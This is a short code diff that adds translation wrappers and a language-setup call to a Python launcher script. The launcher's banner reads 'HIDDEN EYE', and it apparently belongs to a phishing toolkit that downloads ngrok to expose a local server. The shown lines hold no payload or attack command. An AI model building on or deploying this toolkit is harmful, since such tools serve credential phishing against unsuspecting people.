@@ -5,30 +5,34 @@ from os import path, system
 from subprocess import check_output
 from platform import system as systemos, architecture
 from wget import download
+from Defs.Languages import *
+
+checkAndSetLanguage() #WIP!!! MUST BE UPDATED
+
 
 RED, GREEN, DEFAULT = '\033[91m', '\033[1;32m', '\033[0m'
 
 def checkConnection(host='http://duckduckgo.com'): #Connection check
     try:
         urlopen(host)
-        print("{0}Successful connection!{1}".format(GREEN, DEFAULT))
+        print(_("{0}Successful connection!{1}").format(GREEN, DEFAULT))
         return True
     except:
         return False
 
 if checkConnection() == False:
-        print ('''{1}
+        print (_('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
 
                     {0}[{1}!{0}]{1} Network error. Verify your connection.\n
-'''.format(RED, DEFAULT))
+''').format(RED, DEFAULT))
         exit(0)
 
 def checkNgrok(): #Ngrok check
     if path.isfile('Server/ngrok') == False:  #Is Ngrok downloaded?
-        print('[*] Downloading Ngrok...')
+        print(_('[*] Downloading Ngrok...'))
         if 'Android' in str(check_output(('uname', '-a'))):
             filename = 'ngrok-stable-linux-arm.zip'
         else:
